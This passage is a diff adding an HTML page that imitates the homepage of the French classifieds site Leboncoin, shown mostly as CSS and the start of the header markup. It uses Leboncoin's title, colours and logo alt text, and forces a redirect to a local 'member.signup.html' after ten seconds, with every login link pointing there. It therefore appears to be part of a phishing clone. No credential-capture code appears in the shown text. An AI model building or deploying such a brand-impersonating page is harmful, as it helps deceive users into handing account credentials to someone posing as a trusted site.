@@ -1,0 +1,2013 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Leboncoin, site de petites annonces gratuites</title>
+  <meta http-equiv="refresh" content="10;url=member.signup.html">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <style>
+    /* Votre CSS existant ici */
+    :root {
+      --leboncoin-orange: #F26C2A;
+      --leboncoin-dark-gray: #555;
+      --leboncoin-light-gray-bg: #f5f5f5;
+      --leboncoin-white: #fff;
+      --leboncoin-medium-gray: #aaa;
+      --leboncoin-footer-bg: #3A474E;
+      --leboncoin-footer-text: #E0E0E0;
+      --leboncoin-footer-link-hover: #F26C2A;
+    }
+
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: 'Open Sans', Arial, sans-serif;
+      background-color: #white;
+      overflow-x : hidden;
+    }
+
+    body.no-scroll {
+      overflow: hidden;
+    }
+
+    a {
+      text-decoration: none;
+      color: inherit;
+    }
+
+    ul {
+      list-style: none;
+      margin: 0;
+      padding: 0;
+    }
+
+    button {
+      border: none;
+      background: none;
+      cursor: pointer;
+      padding: 0;
+    }
+
+    .page-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      background-color: var(--leboncoin-white);
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
+      position: relative;
+      z-index: 1;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    /* Nouveau style pour le wrapper fixe de l'en-tête */
+    .header-fixed-wrapper {
+        position: fixed; /* Rend l'élément fixe à l'écran */
+        top: 0; /* Le colle en haut de la fenêtre */
+        left: 0;
+        right: 0; /* S'étend sur toute la largeur de la fenêtre */
+        z-index: 100; /* Assure qu'il est au-dessus du contenu */
+        background-color: var(--leboncoin-white); /* Assure un fond blanc */
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1); /* Ajoute une légère ombre */
+    }
+
+    /* Centre les éléments à l'intérieur du wrapper fixe */
+    .header-fixed-wrapper .top-header,
+    .header-fixed-wrapper .categories-nav {
+        max-width: 1200px; /* Limite la largeur des éléments pour qu'ils restent centrés */
+        margin: 0 auto; /* Centre les éléments */
+    }
+
+    .top-header {
+      /* Supprimez : position: relative; */
+      /* Supprimez : z-index: 2; */
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 15px 25px;
+      background-color: var(--leboncoin-white);
+      min-height: 70px;
+    }
+
+    .hamburger-menu {
+      display: none;
+      font-size: 28px;
+      color: var(--leboncoin-dark-gray);
+    }
+
+    .logo {
+      /* Ces styles seront remplacés par l'image, mais nous les gardons pour la compatibilité */
+      font-size: 36px;
+      font-weight: bold;
+      color: var(--leboncoin-orange);
+      margin-right: 25px;
+      z-index: 5;
+    }
+
+    /* NOUVEAU CSS : Styles pour l'image du logo */
+    .logo img {
+        height: 40px; /* Ajustez la hauteur selon la taille de votre logo */
+        width: auto; /* Maintient le ratio d'aspect */
+        vertical-align: middle; /* Alignement vertical */
+    }
+
+    /* NOUVEAU CSS : Ajustements pour le logo dans le menu mobile */
+    .mobile-menu-header .logo img {
+      height: 32px; /* Taille plus petite pour le menu mobile */
+    }
+
+    .deposer-annonce {
+      display: flex;
+      align-items: center;
+      background-color: var(--leboncoin-orange);
+      color: var(--leboncoin-white);
+      padding: 12px 25px;
+      height: 48px;
+      box-sizing: border-box;
+      border-radius: 25px;
+      font-weight: bold;
+      font-size: 16px;
+      margin-right: 25px;
+      white-space: nowrap;
+    }
+
+    .deposer-annonce .fa-plus {
+      margin-right: 10px;
+      font-size: 18px;
+    }
+
+    .search-bar-wrapper {
+        display: flex;
+        flex-grow: 1;
+        border-radius: 28px;
+        background-color: var(--leboncoin-light-gray-bg);
+        overflow: hidden;
+        margin: 0 15px;
+        z-index: 1;
+        min-width: 350px;
+        height: 48px;
+        box-sizing: border-box;
+    }
+
+    .search-bar-wrapper .search-input-area {
+        position: relative;
+        flex-grow: 1;
+        display: flex;
+        align-items: center;
+        background-color: transparent;
+        padding-right: 0;
+    }
+
+    .search-bar-wrapper input {
+        width: 100%;
+        border: none;
+        padding: 0 20px;
+        background-color: transparent;
+        outline: none;
+        font-size: 16px;
+        color: var(--leboncoin-dark-gray);
+        box-sizing: border-box;
+        height: 100%;
+    }
+
+    .search-bar-wrapper input::placeholder {
+        color: #777777;
+    }
+
+    .search-button-combined {
+        background-color: transparent;
+        padding: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: var(--leboncoin-white);
+        flex-shrink: 0;
+        border-radius: 0;
+        height: 100%;
+    }
+
+    .search-button-combined .search-icon-circle {
+        width: 48px;
+        height: 48px;
+        background-color: var(--leboncoin-orange);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-right: 5px;
+        flex-shrink: 0;
+    }
+
+    .search-button-combined .search-icon-circle .fa-magnifying-glass {
+        color: var(--leboncoin-white);
+        font-size: 20px;
+    }
+
+    .nav-icons {
+      display: flex;
+      margin-left: 25px;
+      align-items: center;
+    }
+
+    .nav-icons li {
+      margin-left: 30px;
+      white-space: nowrap;
+    }
+
+    .nav-icons a {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: var(--leboncoin-dark-gray);
+      font-size: 13px;
+      height: 100%;
+    }
+
+    .nav-icons .fa-solid {
+      font-size: 24px;
+      margin-bottom: 5px;
+    }
+
+    /* New "Connectez-vous" button for mobile */
+    .mobile-login-btn {
+        display: none; /* Hidden by default on desktop */
+    }
+
+    .categories-nav {
+      background-color: var(--leboncoin-white);
+      padding: 15px 0;
+      border-top: 1px solid #eee;
+      text-align: center;
+    }
+
+    .categories-nav ul {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 25px;
+    }
+
+    .categories-nav li {
+      position: relative;
+      margin: 0 15px;
+      font-size: 16px;
+      color: var(--leboncoin-dark-gray);
+      white-space: nowrap;
+      padding: 7px 0;
+    }
+
+    .categories-nav li:not(:last-child)::after {
+      content: '•';
+      position: absolute;
+      right: -15px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #ddd;
+      font-size: 18px;
+    }
+
+    .categories-nav a:hover {
+      color: var(--leboncoin-orange);
+    }
+
+    .main-content {
+        flex-grow: 1; /* Permet au contenu de prendre tout l'espace disponible */
+        padding-top: 140px; /* Ajustez cette valeur pour compenser la hauteur du header fixe (env. 70px + 70px) */
+    }
+
+    .mobile-menu-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      z-index: 1000;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.3s, visibility 0.3s;
+    }
+
+    .mobile-menu-overlay.is-open {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .mobile-menu {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 80%;
+      max-width: 300px;
+      height: 100%;
+      background-color: var(--leboncoin-white);
+      z-index: 1001;
+      box-shadow: 2px 0 10px rgba(0, 0, 0, 0.2);
+      transform: translateX(-100%);
+      transition: transform 0.3s;
+      display: flex;
+      flex-direction: column;
+      overflow-y: auto;
+    }
+
+    .mobile-menu::-webkit-scrollbar {
+        display: none;
+    }
+
+    .mobile-menu {
+        scrollbar-width: none;
+    }
+
+    .mobile-menu.is-open {
+      transform: translateX(0);
+    }
+
+    .mobile-menu-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 15px 20px;
+      border-bottom: 1px solid #eee;
+    }
+
+    .mobile-menu-header .logo {
+      /* Ajustez la taille de la police si vous gardez du texte */
+      font-size: 28px;
+      margin-right: 0;
+    }
+
+    .mobile-menu-nav li {
+      border-bottom: 1px solid #f0f0f0;
+    }
+
+    .mobile-menu-nav a {
+      display: flex;
+      align-items: center;
+      padding: 15px 20px;
+      font-size: 16px;
+      color: var(--leboncoin-dark-gray);
+    }
+
+    .mobile-menu-nav a .fa-solid {
+      font-size: 20px;
+      margin-right: 15px;
+    }
+
+    .mobile-menu-nav .category-header {
+      font-weight: bold;
+      color: var(--leboncoin-medium-gray);
+      padding: 15px 20px 5px;
+      font-size: 14px;
+      border-bottom: none;
+    }
+
+    .mobile-menu-nav .section-separator {
+      height: 10px;
+      background-color: #f8f8f8;
+      border-bottom: 1px solid #eee;
+    }
+
+    .mobile-menu-nav .login-section {
+      padding: 15px 20px;
+      border-top: 1px solid #eee;
+      font-size: 16px;
+      font-weight: bold;
+    }
+
+    .call-to-action-banner {
+      background-color: #FEEFE8;
+      border-radius: 12px;
+      padding: 25px 20px;
+      text-align: center;
+      margin: 40px auto;
+      max-width: 1000px;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+    }
+
+    .call-to-action-banner h2 {
+      font-size: 28px;
+      color: #3A474E;
+      margin-bottom: 20px;
+      font-weight: 600;
+    }
+
+    .call-to-action-banner .deposer-annonce-banner {
+      display: inline-flex;
+      align-items: center;
+      background-color: var(--leboncoin-orange);
+      color: var(--leboncoin-white);
+      padding: 12px 25px;
+      border-radius: 30px;
+      font-weight: bold;
+      font-size: 16px;
+      transition: background-color 0.3s ease;
+    }
+
+    .call-to-action-banner .deposer-annonce-banner:hover {
+      background-color: #e06020;
+    }
+
+    .banner-decoration {
+      position: absolute;
+      opacity: 0.7;
+      border-radius: 50%;
+      z-index: 0;
+    }
+
+    .banner-decoration.top-right {
+      width: 120px;
+      height: 120px;
+      top: -60px;
+      right: -60px;
+      transform: rotate(30deg);
+      background: linear-gradient(135deg, #a0c2e3 0%, #87aedb 100%);
+    }
+
+    .banner-decoration.bottom-left {
+      width: 150px;
+      height: 150px;
+      bottom: -75px;
+      left: -75px;
+      transform: rotate(-45deg);
+      background: linear-gradient(135deg, #f0b090 0%, #e09070 100%);
+    }
+
+    .section-title-wrapper {
+        display: flex;
+        justify-content: space-between;
+        align-items: baseline;
+        margin-bottom: 25px;
+        padding-left: 10px;
+        padding-right: 10px;
+    }
+
+    .section-title-wrapper h2 {
+        font-size: 24px;
+        color: #333;
+        margin: 0;
+        font-weight: 600;
+        text-align: left;
+    }
+
+    .section-title-wrapper h3 {
+        font-size: 18px;
+        color: #777;
+        font-weight: normal;
+        margin: 0;
+        text-align: left;
+    }
+
+    .view-more {
+        color: var(--leboncoin-orange);
+        font-weight: bold;
+        font-size: 16px;
+        white-space: nowrap;
+        display: flex;
+        align-items: center;
+        gap: 5px;
+    }
+
+    .view-more:hover {
+        text-decoration: underline;
+    }
+
+    .view-more .fa-arrow-right {
+        font-size: 14px;
+    }
+
+    .lbc-current-deals-section,
+    .trends-section,
+    .top-categories-image-carousel-section {
+      max-width: 1000px;
+      margin: 40px auto;
+      padding: 0 20px;
+    }
+
+    .lbc-current-deals-grid-container,
+    .trends-card-container,
+    .top-categories-image-carousel-container {
+      display: flex;
+      gap: 15px;
+      flex-wrap: nowrap;
+      overflow-x: auto;
+      -webkit-overflow-scrolling: touch;
+      padding-bottom: 10px;
+    }
+
+    .lbc-current-deals-grid-container::-webkit-scrollbar,
+    .trends-card-container::-webkit-scrollbar,
+    .top-categories-image-carousel-container::-webkit-scrollbar {
+        display: none;
+    }
+
+    .lbc-current-deals-grid-container,
+    .trends-card-container,
+    .top-categories-image-carousel-container {
+        scrollbar-width: none;
+    }
+
+    .lbc-deal-card {
+      background-color: var(--leboncoin-white);
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+      flex-shrink: 0;
+      width: 220px;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      height: 320px;
+    }
+
+    .lbc-deal-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
+    }
+
+    .lbc-deal-card-image-wrapper {
+      position: relative;
+      width: 100%;
+      height: 180px;
+      overflow: hidden;
+    }
+
+    .lbc-deal-card-image {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+
+    .lbc-deal-card-favorite-icon {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      color: var(--leboncoin-white);
+      font-size: 22px;
+      text-shadow: 0 0 5px rgba(0,0,0,0.5);
+      z-index: 1;
+      cursor: pointer;
+    }
+
+    .lbc-deal-card-content {
+      padding: 10px 15px;
+      flex-grow: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+
+    .lbc-deal-card-price {
+      font-size: 20px;
+      font-weight: bold;
+      color: var(--leboncoin-dark-gray);
+      margin-bottom: 5px;
+    }
+
+    .lbc-deal-card-title {
+      font-size: 16px;
+      color: #333;
+      margin-bottom: 5px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      display: -webkit-box;
+      -webkit-box-orient: vertical;
+      line-height: 1.3;
+      max-height: 2.6em;
+    }
+
+    .lbc-deal-card-location {
+      font-size: 13px;
+      color: #777;
+      margin-top: auto;
+      margin-bottom: 2px;
+      overflow: hidden;
+      white-space: nowrap;
+      text-overflow: ellipsis;
+    }
+
+    .lbc-deal-card-date {
+      font-size: 12px;
+      color: #999;
+      margin-bottom: 0;
+      white-space: nowrap;
+    }
+
+    .lbc-deal-card-delivery-info {
+        font-size: 12px;
+        color: var(--leboncoin-orange);
+        font-weight: bold;
+        margin-top: 5px;
+    }
+
+    .trends-card {
+        width: calc(20% - 16px);
+        flex-shrink: 0;
+        background-color: var(--leboncoin-white);
+        border-radius: 8px;
+        overflow: hidden;
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        text-align: left;
+        display: flex;
+        flex-direction: column;
+        transition: transform 0.2s ease, box-shadow 0.2s ease;
+        box-sizing: border-box;
+        height: 250px;
+    }
+
+    .trends-card:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
+    }
+
+    .trends-card img {
+        width: 100%;
+        height: 160px;
+        object-fit: cover;
+        display: block;
+    }
+
+    .trends-card-content {
+        padding: 15px;
+        flex-grow: 1;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: calc(250px - 160px);
+        box-sizing: border-box;
+    }
+
+    .trends-card-content p {
+        font-size: 16px;
+        color: var(--leboncoin-dark-gray);
+        margin: 0;
+        font-weight: 600;
+        text-align: center;
+    }
+
+    .carousel-card {
+      position: relative;
+      width: calc((100% - 4 * 20px) / 5);
+      flex-shrink: 0;
+      height: 200px;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      background-color: var(--leboncoin-white);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+      box-sizing: border-box;
+    }
+
+    .carousel-card:hover:not(.ad-card) {
+      transform: translateY(-5px);
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+    }
+
+    .carousel-card .carousel-image {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+
+    .overlay-text-bottom-left {
+      position: absolute;
+      bottom: 15px;
+      left: 15px;
+      color: var(--leboncoin-white);
+      font-size: 18px;
+      font-weight: bold;
+      text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
+      z-index: 1;
+    }
+
+    .navigation-arrow {
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 40px;
+      height: 40px;
+      background-color: var(--leboncoin-white);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      color: var(--leboncoin-dark-gray);
+      cursor: pointer;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+      z-index: 2;
+    }
+
+    .navigation-arrow.left {
+      left: 15px;
+    }
+
+    .navigation-arrow.right {
+      right: 15px;
+    }
+
+    .carousel-card.ad-card {
+      background-color: var(--leboncoin-light-gray-bg);
+      color: var(--leboncoin-dark-gray);
+      font-size: 18px;
+      font-weight: 600;
+      cursor: default;
+      box-shadow: none;
+    }
+
+    .carousel-card.ad-card:hover {
+        transform: none;
+        box-shadow: none;
+    }
+
+    .static-text-section {
+        max-width: 1000px;
+        margin: 0 auto;
+        padding: 40px 20px;
+        text-align: center;
+        font-size: 16px;
+        line-height: 1.6;
+        color: #333;
+    }
+    .static-text-section p {
+        margin: 0;
+    }
+
+    /* Footer Styles */
+    .main-footer {
+        background-color: var(--leboncoin-footer-bg);
+        color: var(--leboncoin-footer-text);
+        padding: 50px 20px 20px;
+        font-size: 14px;
+        flex-shrink: 0;
+    }
+
+    .footer-content {
+        max-width: 1000px;
+        margin: 0 auto;
+        display: grid;
+        grid-template-columns: repeat(4, 1fr);
+        gap: 20px;
+        padding-bottom: 40px;
+        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .footer-column h3 {
+        font-size: 16px;
+        font-weight: bold;
+        margin-bottom: 20px;
+        color: var(--leboncoin-white);
+        position: relative;
+        padding-bottom: 10px;
+    }
+
+    .footer-column h3::after {
+        content: '';
+        position: absolute;
+        left: 0;
+        bottom: 0;
+        width: 100%;
+        height: 2px;
+        background-color: var(--leboncoin-footer-text);
+        transition: background-color 0.3s ease;
+    }
+
+    .footer-column h3:hover::after {
+        background-color: var(--leboncoin-orange);
+    }
+
+    .footer-column ul {
+        list-style: none;
+        padding: 0;
+        margin: 0;
+    }
+
+    .footer-column li {
+        margin-bottom: 10px;
+    }
+
+    .footer-column a {
+        color: var(--leboncoin-footer-text);
+        text-decoration: none;
+        transition: color 0.3s ease;
+        position: relative;
+        display: inline-block;
+    }
+
+    .footer-column a:hover {
+        color: var(--leboncoin-orange);
+        text-decoration: underline;
+        text-decoration-color: var(--leboncoin-orange);
+        text-decoration-thickness: 1px;
+    }
+
+    .footer-bottom {
+        max-width: 1000px;
+        margin: 20px auto 0;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        flex-wrap: wrap;
+        padding-top: 20px;
+    }
+
+    .social-media-links {
+        display: flex;
+        gap: 15px;
+    }
+
+    .social-media-links a {
+        color: var(--leboncoin-footer-text);
+        font-size: 20px;
+        transition: color 0.3s ease;
+    }
+
+    .social-media-links a:hover {
+        color: var(--leboncoin-orange);
+    }
+
+    .app-links {
+        display: flex;
+        gap: 15px;
+        align-items: center;
+    }
+
+    .app-links a {
+        display: block;
+    }
+
+    .app-links img {
+        height: 35px;
+        border-radius: 5px;
+    }
+
+    .copyright {
+        margin-top: 20px;
+        text-align: center;
+        width: 100%;
+        color: rgba(255, 255, 255, 0.5);
+    }
+
+    /* ************************************************************* */
+    /* Règles CSS pour mobile (max-width: 768px)       */
+    /* ************************************************************* */
+    @media (max-width: 768px) {
+      .top-header {
+        flex-wrap: wrap;
+        justify-content: flex-start;
+        padding: 15px 20px;
+      }
+
+      .hamburger-menu {
+        display: block;
+        margin-right: 15px;
+        order: 1;
+        position: relative;
+        z-index: 10;
+      }
+
+      .logo {
+        /* Adapte la taille du logo image pour mobile */
+        font-size: 0; /* Cache le texte si il reste */
+        flex-grow: 1;
+        text-align: center;
+        margin-right: 0;
+        order: 2;
+        flex-shrink: 0;
+        position: relative;
+        z-index: 9;
+      }
+
+      /* Ajuste la taille de l'image du logo pour mobile */
+      .logo img {
+          height: 35px; /* Taille légèrement plus petite pour mobile */
+      }
+
+      /* Adjust top-header::after for mobile */
+      .top-header::after {
+        content: '';
+        display: none; /* Hide the empty space used for alignment on desktop */
+      }
+
+      .deposer-annonce,
+      .nav-icons {
+        display: none;
+      }
+
+      /* Show and style the new mobile login button */
+      .mobile-login-btn {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background-color: var(--leboncoin-white); /* Background is white to show the orange text */
+        border: 1px solid var(--leboncoin-orange); /* Orange border */
+        color: var(--leboncoin-orange); /* Orange text */
+        padding: 8px 15px;
+        border-radius: 5px; /* Slightly rounded corners */
+        font-weight: bold;
+        font-size: 14px;
+        height: 35px; /* Adjust height to align with menu icon */
+        box-sizing: border-box;
+        margin-left: auto; /* Push to the right */
+        order: 3;
+        flex-shrink: 0;
+        white-space: nowrap;
+      }
+
+      .mobile-login-btn span {
+          margin: 0;
+          font-weight: bold;
+      }
+
+      .search-bar-wrapper {
+        width: calc(100% - 40px);
+        order: 4;
+        margin-top: 20px;
+        margin-left: auto;
+        margin-right: auto;
+        padding: 0;
+        display: flex;
+        height: auto;
+        position: relative;
+        z-index: 5;
+      }
+
+      .search-input-area input {
+        padding: 15px 20px 15px 45px;
+      }
+
+      .search-bar-wrapper .input-icon {
+        display: block;
+        position: absolute;
+        left: 15px;
+        top: 50%;
+        transform: translateY(-50%);
+        font-size: 18px;
+        color: #777777;
+        z-index: 6;
+      }
+
+      .search-button-combined {
+        display: none;
+      }
+
+      .categories-nav {
+        display: block;
+        padding: 10px 0;
+        overflow-x: auto;
+        -webkit-overflow-scrolling: touch;
+        white-space: nowrap;
+        border-top: none;
+        background-color: var(--leboncoin-white);
+        box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+      }
+
+      .categories-nav::-webkit-scrollbar {
+          display: none;
+      }
+
+      .categories-nav {
+          scrollbar-width: none;
+      }
+
+      .categories-nav .categories-scroll-wrapper {
+        display: flex;
+        padding: 0 10px;
+      }
+
+      .categories-nav ul {
+        display: inline-flex;
+        justify-content: flex-start;
+        flex-wrap: nowrap;
+        padding: 0;
+        margin: 0;
+      }
+
+      .categories-nav li {
+        margin: 0 10px;
+        padding: 5px 0;
+        flex-shrink: 0;
+      }
+
+      .categories-nav li:not(:last-child)::after {
+        content: '';
+        display: none;
+      }
+
+      .main-content {
+        padding-top: 200px; /* Ajustez cette valeur pour mobile, le header est plus haut */
+      }
+
+      .call-to-action-banner {
+        margin: 20px 15px;
+        padding: 20px 15px;
+      }
+
+      .call-to-action-banner h2 {
+        font-size: 22px;
+        margin-bottom: 15px;
+      }
+
+      .call-to-action-banner .deposer-annonce-banner {
+        padding: 10px 20px;
+        font-size: 15px;
+      }
+
+      .banner-decoration.top-right {
+        width: 80px;
+        height: 80px;
+        top: -40px;
+        right: -40px;
+      }
+
+      .banner-decoration.bottom-left {
+        width: 100px;
+        height: 100px;
+        bottom: -50px;
+        left: -50px;
+      }
+
+      .section-title-wrapper {
+          flex-direction: row;
+          align-items: center;
+          margin-bottom: 15px;
+          padding-left: 15px;
+          padding-right: 15px;
+      }
+
+      .section-title-wrapper h2,
+      .section-title-wrapper h3 {
+          text-align: left;
+          margin: 0;
+      }
+
+      .section-title-wrapper h2 {
+        font-size: 20px;
+      }
+
+      .section-title-wrapper h3 {
+        font-size: 16px;
+      }
+
+      .view-more {
+          font-size: 0;
+          margin-left: auto;
+      }
+
+      .view-more .fa-arrow-right {
+          font-size: 20px;
+          margin: 0;
+      }
+
+      .lbc-current-deals-section,
+      .trends-section,
+      .top-categories-image-carousel-section {
+        margin: 20px auto;
+        padding: 0 15px;
+      }
+
+      .lbc-current-deals-grid-container {
+        gap: 10px;
+        justify-content: flex-start;
+      }
+
+      .lbc-deal-card {
+        width: 160px;
+        height: 280px;
+      }
+
+      .lbc-deal-card-image-wrapper {
+        height: 140px;
+      }
+
+      .lbc-deal-card-favorite-icon {
+        font-size: 18px;
+        top: 8px;
+        right: 8px;
+      }
+
+      .lbc-deal-card-price {
+        font-size: 18px;
+      }
+
+      .lbc-deal-card-title {
+        font-size: 14px;
+        max-height: 2.4em;
+      }
+
+      .lbc-deal-card-location {
+        font-size: 11px;
+      }
+
+      .lbc-deal-card-date {
+        font-size: 10px;
+      }
+
+      .trends-section {
+          margin: 20px 0;
+          padding: 0 15px;
+      }
+
+      .trends-card-container {
+          justify-content: flex-start;
+          gap: 15px;
+      }
+
+      .trends-card {
+          width: 180px;
+          height: 220px;
+          flex-shrink: 0;
+      }
+
+      .trends-card img {
+        height: 130px;
+      }
+
+      .trends-card-content {
+        height: calc(220px - 130px);
+      }
+
+      .top-categories-image-carousel-section {
+        margin: 30px auto;
+        padding: 0 15px;
+      }
+      .top-categories-image-carousel-container {
+        justify-content: flex-start;
+        gap: 15px;
+      }
+      .carousel-card {
+        width: 220px;
+        height: 180px;
+      }
+      .overlay-text-bottom-left {
+        font-size: 16px;
+        bottom: 10px;
+        left: 10px;
+      }
+      .navigation-arrow {
+        width: 35px;
+        height: 35px;
+        font-size: 18px;
+      }
+      .navigation-arrow.left { left: 10px; }
+      .navigation-arrow.right { right: 10px; }
+
+      .carousel-card.ad-card {
+        font-size: 16px;
+      }
+
+      .static-text-section {
+          margin: 0 auto;
+          padding: 20px 15px;
+          font-size: 14px;
+      }
+
+      /* Footer Responsive */
+      .main-footer {
+          padding: 30px 15px 15px;
+      }
+
+      .footer-content {
+          grid-template-columns: repeat(2, 1fr);
+          gap: 30px 20px;
+          padding-bottom: 30px;
+      }
+
+      .footer-column {
+          text-align: left;
+      }
+
+      .footer-column h3 {
+          font-size: 15px;
+          margin-bottom: 10px;
+          padding-bottom: 5px;
+      }
+
+      .footer-column h3::after {
+          width: 100%;
+          height: 1px;
+      }
+
+      .footer-column li {
+          margin-bottom: 8px;
+      }
+
+      .footer-column a {
+          font-size: 13px;
+      }
+
+      .footer-bottom {
+          flex-direction: column;
+          align-items: center;
+          gap: 20px;
+          padding-top: 15px;
+      }
+
+      .social-media-links {
+          margin-bottom: 0;
+      }
+
+      .app-links {
+          flex-wrap: wrap;
+          justify-content: center;
+      }
+
+      .app-links img {
+          height: 30px;
+      }
+
+      .copyright {
+          font-size: 12px;
+          margin-top: 15px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .trends-section h2 {
+        font-size: 18px;
+      }
+      .trends-card {
+          width: 160px;
+          height: 200px;
+      }
+      .trends-card img {
+        height: 120px;
+      }
+      .trends-card-content {
+        height: calc(200px - 120px);
+      }
+
+      .carousel-card {
+          width: 180px;
+          height: 150px;
+      }
+      .overlay-text-bottom-left {
+        font-size: 14px;
+        bottom: 8px;
+        left: 8px;
+      }
+      .navigation-arrow {
+        width: 30px;
+        height: 30px;
+        font-size: 16px;
+      }
+      .navigation-arrow.left { left: 8px; }
+      .navigation-arrow.right { right: 8px; }
+
+      .footer-content {
+          grid-template-columns: 1fr;
+          gap: 20px;
+      }
+      .footer-column h3 {
+          text-align: center;
+      }
+      .footer-column h3::after {
+          left: 50%;
+          transform: translateX(-50%);
+          width: 80%;
+      }
+      .footer-column ul {
+          text-align: center;
+      }
+    }
+  </style>
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96" />
+<link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+<link rel="shortcut icon" href="/favicon.ico" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+<link rel="manifest" href="/site.webmanifest" />
+</head>
+<body>
+  <div class="mobile-menu-overlay"></div>
+  <div class="mobile-menu">
+    <div class="mobile-menu-header">
+      <a href="#" class="logo"><img src="logodujour2.png" alt="Leboncoin Logo"></a>
+      <button class="close-menu-btn" aria-label="Fermer le menu">
+        <i class="fas fa-times"></i>
+      </button>
+    </div>
+    <nav class="mobile-menu-nav">
+      <ul>
+        <li><a href="#"><i class="fas fa-comment-dots"></i>Messages</a></li>
+        <li><a href="#"><i class="fas fa-heart"></i>Favoris</a></li>
+        <li><a href="#"><i class="fas fa-bell"></i>Recherches sauvegardées</a></li>
+        <li class="section-separator"></li>
+        <li class="category-header">Catégories</li>
+        <li><a href="#">Immobilier</a></li>
+        <li><a href="#">Véhicules</a></li>
+        <li><a href="#">Vacances</a></li>
+        <li><a href="#">Emploi</a></li>
+        <li><a href="#">Mode</a></li>
+        <li><a href="#">Maison & Jardin</a></li>
+        <li><a href="#">Famille</a></li>
+        <li><a href="#">Électronique</a></li>
+        <li><a href="#">Loisirs</a></li>
+        <li><a href="#">Autres</a></li>
+        <li class="section-separator"></li>
+        <li class="login-section"><a href="member.signup.html">Se connecter</a></li>
+      </ul>
+    </nav>
+  </div>
+
+  <div class="page-container">
+    <header>
+      <div class="header-fixed-wrapper">
+        <nav class="top-header">
+          <button class="hamburger-menu" aria-label="Ouvrir le menu mobile">
+            <i class="fas fa-bars"></i>
+          </button>
+          <a href="#" class="logo"><img src="logodujour2.png" alt="Leboncoin Logo"></a>
+          <a href="member.signup.html" class="mobile-login-btn">
+            <span>Se connecter</span>
+          </a>
+          <button class="deposer-annonce">
+            <i class="fas fa-plus"></i>Déposer une annonce
+          </button>
+          <div class="search-bar-wrapper">
+            <div class="search-input-area">
+              <i class="fas fa-magnifying-glass input-icon"></i>
+              <input type="text" placeholder="Rechercher sur leboncoin" />
+            </div>
+            <button class="search-button-combined" aria-label="Lancer la recherche">
+              <span class="search-icon-circle">
+                <i class="fas fa-magnifying-glass"></i>
+              </span>
+            </button>
+          </div>
+          <ul class="nav-icons">
+            <li><a href="#"><i class="fas fa-bell"></i><span>Mes recherches</span></a></li>
+            <li><a href="#"><i class="fas fa-heart"></i><span>Favoris</span></a></li>
+            <li><a href="#"><i class="fas fa-comment-dots"></i><span>Messages</span></a></li>
+            <li><a href="member.signup.html"><i class="fas fa-user"></i><span>Se connecter</span></a></li>
+          </ul>
+        </nav>
+        <nav class="categories-nav">
+          <div class="categories-scroll-wrapper">
+            <ul>
+              <li><a href="#">Immobilier</a></li>
+              <li><a href="#">Véhicules</a></li>
+              <li><a href="#">Vacances</a></li>
